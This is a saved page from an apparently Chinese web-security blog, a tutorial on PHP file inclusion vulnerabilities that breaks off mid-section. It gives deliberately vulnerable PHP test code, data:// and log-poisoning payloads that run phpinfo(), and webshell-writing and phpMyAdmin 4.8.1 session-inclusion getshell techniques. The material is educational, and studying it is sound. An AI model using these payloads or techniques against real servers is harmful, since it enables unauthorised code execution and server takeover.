@@ -1,0 +1,878 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="websec"><meta name="keywords" content=""><meta name="author" content="uf9n1x,1916003479@qq.com"><meta name="copyright" content="uf9n1x"><title>君子慎独，不欺暗室 | Uf9n1x's Blog</title><link rel="shortcut icon" href="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/avator3.JPG"><link rel="stylesheet" href="/css/index.css?version=1.9.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  hexoVersion: '6.3.0'
+} </script><meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="Uf9n1x's Blog" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/avator3.JPG"></div><div class="author-info__name text-center">uf9n1x</div><div class="author-info__description text-center">websec</div><div class="follow-button"><a target="_blank" rel="noopener" href="https://github.com/uf9n1x">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">43</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">35</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">30</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Some links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://www.cnblogs.com/uf9n1x/">博客园</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://www.yuque.com/uf9n1x">语雀</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://music.163.com/">Music</a></div></div></div><nav id="nav" style="background-image: url(https://blog-1313934826.cos.ap-chengdu.myqcloud.com/normal-images/psc.png#https://s1.ax1x.com/2023/04/14/p9Sd0ns.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Uf9n1x's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">主页</a><a class="site-page" href="/archives">归档</a><a class="site-page" href="/categories">分类</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/about">About</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> 搜索</span></a></span></div><div id="site-info"><div id="site-title">Uf9n1x's Blog</div><div id="site-sub-title">君子慎独，不欺暗室</div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2023/04/16/include-file/">文件包含</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-04-16</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/websec/">websec</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/wensec/">wensec</a></span><div class="content"><h2 id="0X01-前言"><a href="#0X01-前言" class="headerlink" title="0X01 前言"></a><strong>0X01 前言</strong></h2><p>这篇文章介绍文件包含漏洞。</p>
+<h2 id="0X02-最常见的两个函数的形象解释："><a href="#0X02-最常见的两个函数的形象解释：" class="headerlink" title="0X02 最常见的两个函数的形象解释："></a><strong>0X02 最常见的两个函数的形象解释：</strong></h2><p>我们知道文件包含最常见的是两个函数 include() require()（这里就不谈他们的亲戚 include_once() 和 require_once() 了）</p>
+<p>在php 这个工厂里，include() 是一个比较松散的员工，平时没有活干的时候他就闲着，从来不想着自己看有什么活主动一点，于是只有当程序运行到 include() 的时候他才会执行，并且呢也因为他松散的天性，在出错的时候他也只是报一个警告，并不会让程序中断</p>
+<p>但是，有另一名员工 require() 他能力和include() 差不多，但是他这个人就非常的有上进心，工作认真负责，他一看到程序运行就立刻包含，不会像include() 一样等别人催，并且 require() 还会在出错的时候非常认真地报错，并小心谨慎地阻止程序继续运行</p>
+<h2 id="0X03-回顾allow-url-fopen-amp-allow-url-include"><a href="#0X03-回顾allow-url-fopen-amp-allow-url-include" class="headerlink" title="0X03 回顾allow_url_fopen &amp; allow_url_include"></a><strong>0X03 回顾allow_url_fopen &amp; allow_url_include</strong></h2><p>之前玩PHP文件包含的时候似乎没有怎么深入的试验过这两个选项的开启对PHP文件包含究竟有什么影响，网上的大多数的资料也都是含糊其辞，反正我是没找到比较统一的说法，可能我太菜了，于是我不想浪费时间，打算亲自试一试。</p>
+<h3 id="1-PHP-文件有哪几种常见的函数？"><a href="#1-PHP-文件有哪几种常见的函数？" class="headerlink" title="1.PHP 文件有哪几种常见的函数？"></a><strong>1.PHP 文件有哪几种常见的函数？</strong></h3><p>include()/include_once()<br>require()/require_once()<br>file_get_contents()<br>readfile()</p>
+<p>那么这两个选项的开启与否是对这几个函数的包含能力有什么影响呢？我们下面做一个测试。</p>
+<h3 id="2-测试开始："><a href="#2-测试开始：" class="headerlink" title="2.测试开始："></a><strong>2.测试开始：</strong></h3><h4 id="一、include"><a href="#一、include" class="headerlink" title="一、include()"></a><strong>一、include()</strong></h4><p><strong>测试代码：</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span> 
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>1.allow_url_fopen = Off | allow_url_include = Off</p>
+<p>(1)普通方式包含本地文件（正常）<br>(2)普通方式包含远程文件（不正常）<br>(3)伪协议方式包含文件（不正常）</p>
+<p>2.allow_url_fopen = Off | allow_url_include = On </p>
+<p>(1)普通方式包含本地文件(正常)<br>(2)普通方式包含远程文件(不正常)<br>(3)伪协议方式包含文件(正常)</p>
+<p>3.allow_url_fopen = On | allow_url_include = Off</p>
+<p>(1)普通方式包含本地文件(正常)<br>(2)普通方式包含远程文件(不正常)<br>(3)伪协议方式包含文件(不正常)</p>
+<p>4.allow_url_fopen = On | allow_url_include = On</p>
+<p>(1)普通方式包含本地文件(正常)<br>(2)普通方式包含远程文件(正常)<br>(3)伪协议方式包含文件(正常)</p>
+<p><strong>结论：</strong></p>
+<p>对include()：</p>
+<p>allow_url_include 的开启对能否使用<strong>伪协议 php://input  data://<strong>的形式起着</strong>决定作用</strong>，其他伪协议似乎没有影响<br>allow_url_fopen单独开启没有实质作用，但是和 allow_url_include 结合就能实现远程包含</p>
+<h4 id="二、require"><a href="#二、require" class="headerlink" title="二、require()"></a><strong>二、require()</strong></h4><p><strong>测试代码：</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span> 
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>经测试，require() 和 include() 是一样的结果</p>
+<h4 id="三、readfile"><a href="#三、readfile" class="headerlink" title="三、readfile()"></a><strong>三、readfile()</strong></h4><p><strong>测试代码：</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">echo</span>  <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span> 
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>1.allow_url_fopen = Off | allow_url_include = Off</p>
+<p>(1)普通方式读取本地文件（正常–&gt;源码中出现）<br>(2)普通方式读取远程文件（不正常–&gt;报错）<br>(3)伪协议方式读取文件（不正常 –&gt;源码不出现）</p>
+<p>2.allow_url_fopen = Off | allow_url_include = On </p>
+<p>(1)普通方式读取本地文件(正常–&gt;源码出现)<br>(2)普通方式读取远程文件(不正常–&gt;报错)<br>(3)伪协议方式读取文件(正常–&gt;源码出现)</p>
+<p>3.allow_url_fopen = On | allow_url_include = Off</p>
+<p>(1)普通方式读取本地文件(正常–&gt;源码出现)<br>(2)普通方式读取远程文件(正常–&gt;源码出现)<br>(3)伪协议方式读取文件(正常–&gt;源码出现)</p>
+<p>4.allow_url_fopen = On | allow_url_include = On</p>
+<p>(1)普通方式读取本地文件(正常–&gt;源码出现)<br>(2)普通方式读取远程文件(正常–&gt;源码出现)<br>(3)伪协议方式读取文件(正常–&gt;源码出现)</p>
+<p><strong>结论：</strong></p>
+<p>对readfile()：</p>
+<p>allow_url_include 对其没有任何影响<br>allow_url_fopen 能让其读取远程文件</p>
+<p><strong>注：</strong>readfile 返回从文件中读入的字节数，所以页面中返回的应该是读取到的文件的字节数</p>
+<h4 id="三、file-get-contents"><a href="#三、file-get-contents" class="headerlink" title="三、file_get_contents()"></a><strong>三、file_get_contents()</strong></h4><p><strong>测试代码：</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">echo</span>  <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span> 
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>1.allow_url_fopen = Off | allow_url_include = Off</p>
+<p>(1)普通方式读取本地文件（正常–&gt;源码出现）<br>(2)普通方式读取远程文件（不正常–&gt;报错）<br>(3)伪协议方式读取文件（正常–&gt;源码出现）</p>
+<p>2.allow_url_fopen = Off | allow_url_include = On </p>
+<p>(1)普通方式读取本地文件(正常–&gt;源码出现)<br>(2)普通方式读取远程文件(不正常–&gt;报错)<br>(3)伪协议方式读取文件(正常–&gt;源码出现)</p>
+<p>3.allow_url_fopen = On | allow_url_include = Off</p>
+<p>(1)普通方式读取本地文件(正常–&gt;源码出现)<br>(2)普通方式读取远程文件(正常–&gt;源码出现)<br>(3)伪协议方式读取文件(正常–&gt;源码出现)</p>
+<p>4.allow_url_fopen = On | allow_url_include = On</p>
+<p>(1)普通方式读取本地文件(正常–&gt;源码出现)<br>(2)普通方式读取远程文件(正常–&gt;源码出现)<br>(3)伪协议方式读取文件(正常–&gt;源码出现)</p>
+<p><strong>结论：</strong></p>
+<p>对 file_get_contents()</p>
+<p>allow_url_include 对其没有任何影响<br>allow_url_fopen 能让其读取远程文件</p>
+<h2 id="0X04-文件包含的分类以及利用方式："><a href="#0X04-文件包含的分类以及利用方式：" class="headerlink" title="0X04 文件包含的分类以及利用方式："></a><strong>0X04 文件包含的分类以及利用方式：</strong></h2><h3 id="一、远程文件包含："><a href="#一、远程文件包含：" class="headerlink" title="一、远程文件包含："></a><strong>一、远程文件包含：</strong></h3><h4 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1.基本概念"></a><strong>1.基本概念</strong></h4><p>远程文件包含一般需要 allow_url_fopen 和 allow_url_include 全部打开，其主要利用就是包含远程服务器上面的恶意代码，让其在目标主机上运行，这样我们就能得到一个假的webshell(这个shell 是基于服务器上本身存在的文件的)，有了这个假的shell 我们实际上就能进行操作了，<strong>但是如果你有强迫症</strong>，非要一个自己写的完整的 shell 放在服务器上，我们可以有两种方法:</p>
+<p><strong>(1)方法一：</strong></p>
+<p>我们包含的文件并不是一句话，而是使用 </p>
+<p>file_put_contents(“路径”,”内容”)； </p>
+<p>向 web 目录（一般网站的web 目录都是可写的）写入一个 真shell，然后我们去连，这也是在我们遇到文件飞快删除的一个解决方法（条件竞争中或者是AWD中经常用）</p>
+<p><strong>(2)方法二：</strong></p>
+<p>利用这个假shell 的小马，上传另一个小马（我觉得没有必要），或者上传一个大马上去</p>
+<h4 id="2-常见利用"><a href="#2-常见利用" class="headerlink" title="2.常见利用"></a><strong>2.常见利用</strong></h4><p>既然是包含远程文件，那我们是不是要用到协议，除了常见的 http:// https:// php 还给我们提供了常见的可以用来包含的协议，比如说 ftp:// data:// </p>
+<p>我就用 data 给大家演示一下</p>
+<p><strong>data://</strong></p>
+<p>其实不仅仅是 PHP 连浏览器都支持 data: 协议</p>
+<p><strong>格式：</strong></p>
+<pre class="line-numbers language-php"><code class="language-php">data<span class="token punctuation">:</span>资源类型<span class="token punctuation">;</span>编码<span class="token punctuation">,</span>内容 
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>简单来说，要生成一个html资源，可以这样：</p>
+<pre class="line-numbers language-php"><code class="language-php">data<span class="token punctuation">:</span>text<span class="token operator">/</span>html<span class="token punctuation">;</span>ascii<span class="token punctuation">,</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>hello<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>world<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span> 
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这里我直接给出 payload:</p>
+<pre class="line-numbers language-php"><code class="language-php">data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/plain;base64,PD9waHAgcGhwaW5mbygpOw== </span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>其中 base64 部分就是 &lt;?php phpinfo();</p>
+<p><strong>如图所示：</strong></p>
+<p>[<img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161625383.png" alt="img">](<a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/php">https://picture-1253331270.cos.ap-beijing.myqcloud.com/php</a> data.png)</p>
+<h3 id="二、本地文件包含："><a href="#二、本地文件包含：" class="headerlink" title="二、本地文件包含："></a><strong>二、本地文件包含：</strong></h3><p>本地文件包含是在远程文件包含不能使用的情况下的选择，我们包含的对象主要是敏感文件，以及我们可控内容的文件,以下是常见的可以包含的文件：</p>
+<h4 id="1-日志"><a href="#1-日志" class="headerlink" title="1.日志"></a><strong>1.日志</strong></h4><p>日志文件污染是通过将注入目标系统的代码写入到日志文件中。通常，访问目标系统上的某些对外开放的服务时，系统会自动将访问记录写入到日志文件中，利用这个机制，有可能会将代码写入到日志中。例如，利用一个包含PHP反弹shell的URL访问目标系统时，目标系统会返回一个404页面，并将创建一个apache的访问记录，记录中会包含之前的PHP反弹shell。利用之前已经发现的文件包含漏洞，可以解析apache的日志文件，从而执行日志中的PHP反弹shell。</p>
+<p>日志文件的位置的确定就要前期的信息收集，一方面确定默认的日志的位置，另一方面可以利用这个包含漏洞包含一些配置文件寻找日志的位置</p>
+<p><strong>测试代码：</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string">"rf"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'rf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">!=</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">'&lt;script>window.location.href = "./incfile.php?rf="&lt;/script>'</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span>
+
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>
+        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span>
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span> 
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>
+        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span>
+            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span></span>测试页： rf<span class="token operator">=</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></span>
+            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span></span><span class="token operator">--</span><span class="token operator">--</span>测试完毕后请立即删除<span class="token operator">--</span><span class="token operator">--</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span></span>
+        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span>
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>首先我们截获数据包，在传入参数的地方输入</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> 
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>如图所示：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%971.png"><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161625515.png" alt="img"></a></p>
+<p>之后我们就会在access.log 中看到我们的请求</p>
+<p><strong>如图所示：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%972.png"><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161625570.png" alt="img"></a></p>
+<p>尝试包含</p>
+<p><strong>如图所示：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%973.png"><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161625454.png" alt="img"></a></p>
+<p>可以看到我们成功的包含了日志文件</p>
+<p><strong>注意：</strong></p>
+<p>(1)除了我们包含 access.log 以外，我们还可以制造错误，然后包含 error.log<br>(2)如果出现包含不成功的情况，很有可能就是被 open_base_dir() 限制了<br>(3)实战中最好在凌晨的时候进行包含，要不然日志太大包含会失败<br>(4)除了 apache 和 nginx 的日志 还有很多其他的日志我们能利用，比如说 ssh 的日志 </p>
+<h4 id="2-SESSION"><a href="#2-SESSION" class="headerlink" title="2.SESSION"></a><strong>2.SESSION</strong></h4><h5 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a><strong>原理分析</strong></h5><p>使用了session来保存用户会话，php手册中是这样描述的：</p>
+<p>1.PHP 会将会话中的数据设置到 $_SESSION变量中。<br>2.<strong>当 PHP 停止的时候</strong>，它会自动读取 $_SESSION 中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存。<br>3.对于文件会话保存管理器，会将会话数据保存到配置项 session.save_path 所指定的位置。</p>
+<p>php的session文件的保存路径可以在phpinfo()的session.save_path看到，</p>
+<p><strong>如图所示：</strong></p>
+<p>[<img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161625277.png" alt="img">](<a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/session">https://picture-1253331270.cos.ap-beijing.myqcloud.com/session</a> 存放位置.png)</p>
+<p><strong>补充：</strong></p>
+<p>常见的php-session存放位置：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>sess_PHPSESSID
+<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>sess_PHPSESSID
+<span class="token operator">/</span>tmp<span class="token operator">/</span>sess_PHPSESSID
+<span class="token operator">/</span>tmp<span class="token operator">/</span>sessions<span class="token operator">/</span>sess_PHPSESSID
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>我们来亲自做一个小实验吧</p>
+<p>首先我们使用 php 中的创建 session 的函数写一段小代码</p>
+<p><strong>示例代码：</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
+<span class="token comment" spellcheck="true">//启动session的初始化</span>
+<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">//注册session变量，赋值为一个用户的名称 </span>
+<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"K0rz3n"</span><span class="token punctuation">;</span> 
+<span class="token delimiter">?></span> 
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>然后访问这个页面后，我们去 phpinfo 中告诉我们的位置找一下这个文件</p>
+<p><strong>如图所示：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/session%E6%96%87%E4%BB%B6.png"><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161625211.png" alt="img"></a></p>
+<p>再看一下我们的 cookie 中的 PHPSESSID</p>
+<p><strong>如图所示：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/PHPSESSID.png"><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161625410.png" alt="img"></a></p>
+<p>是不是和文件名中的一部分完全一样？ 再次验证了session 文件的命名规则是 sess_[PHPSESSID]</p>
+<p>session 里面的内容是什么呢</p>
+<p><strong>如图所示：</strong></p>
+<p>[<img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161625923.png" alt="img">](<a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/session">https://picture-1253331270.cos.ap-beijing.myqcloud.com/session</a> 内容.png)</p>
+<p>我们清楚地看到，session 文件中的内容正是文档中所说的是一个序列化过的内容</p>
+<h5 id="实战一：PhpMyadmin-4-8-1-后台-getshell"><a href="#实战一：PhpMyadmin-4-8-1-后台-getshell" class="headerlink" title="实战一：PhpMyadmin 4.8.1 后台 getshell"></a><strong>实战一：PhpMyadmin 4.8.1 后台 getshell</strong></h5><p>所以我们如果想包含 session 文件，要求还是比较的苛刻，我们必须要能控制 session 的输入，但是最近我发现了一个很好的实例 PhpMyadmin 4.8.1 后台 getshell ，其中有一种巧妙的利用方式就是利用包含我们访问 phpmyadmin 的 session 文件</p>
+<p>我们只要在 phpmyadmin 中执行如下语句</p>
+<pre class="line-numbers language-php"><code class="language-php">select <span class="token string">"&lt;?php phpinfo();?>"</span><span class="token punctuation">;</span> 
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>如图所示：</strong></p>
+<p>[<img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161625133.png" alt="img">](<a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/phpmyadmin">https://picture-1253331270.cos.ap-beijing.myqcloud.com/phpmyadmin</a> 包含session1.png)</p>
+<p>然后我们去找那个 session 文件</p>
+<p><strong>如图所示：</strong></p>
+<p>[<img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161625328.png" alt="img">](<a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/phpmyadmin">https://picture-1253331270.cos.ap-beijing.myqcloud.com/phpmyadmin</a> 包含session2.png)</p>
+<p>哈哈，接下来就是我们文件包含漏洞大显申通的时候了</p>
+<h5 id="实战二：利用-session-upload-progress-getshell"><a href="#实战二：利用-session-upload-progress-getshell" class="headerlink" title="实战二：利用 session.upload_progress getshell"></a><strong>实战二：利用 session.upload_progress getshell</strong></h5><p>在我们的利用面涉及到两个重要的选项，<strong>session_upload_progress.enable</strong> 和 <strong>session_upload_progress.cleanu</strong>p 而这两个选项 php 官方是默认开启的，并且强烈推荐我们开启</p>
+<p><strong>如图所示：</strong></p>
+<p>[<img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161625594.png" alt="img">](<a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Progress">https://picture-1253331270.cos.ap-beijing.myqcloud.com/Progress</a> enable default.png)此处输入图片的描述</p>
+<p>我们回归正题，先解释一下这个上传进度的概念</p>
+<h6 id="1-先来了解一下什么是-session-upload-progress"><a href="#1-先来了解一下什么是-session-upload-progress" class="headerlink" title="1.先来了解一下什么是 session.upload_progress"></a><strong>1.先来了解一下什么是 session.upload_progress</strong></h6><p><strong>session.upload_progress 是PHP5.4的新特征</strong></p>
+<p><strong>官方文档的介绍如下：</strong></p>
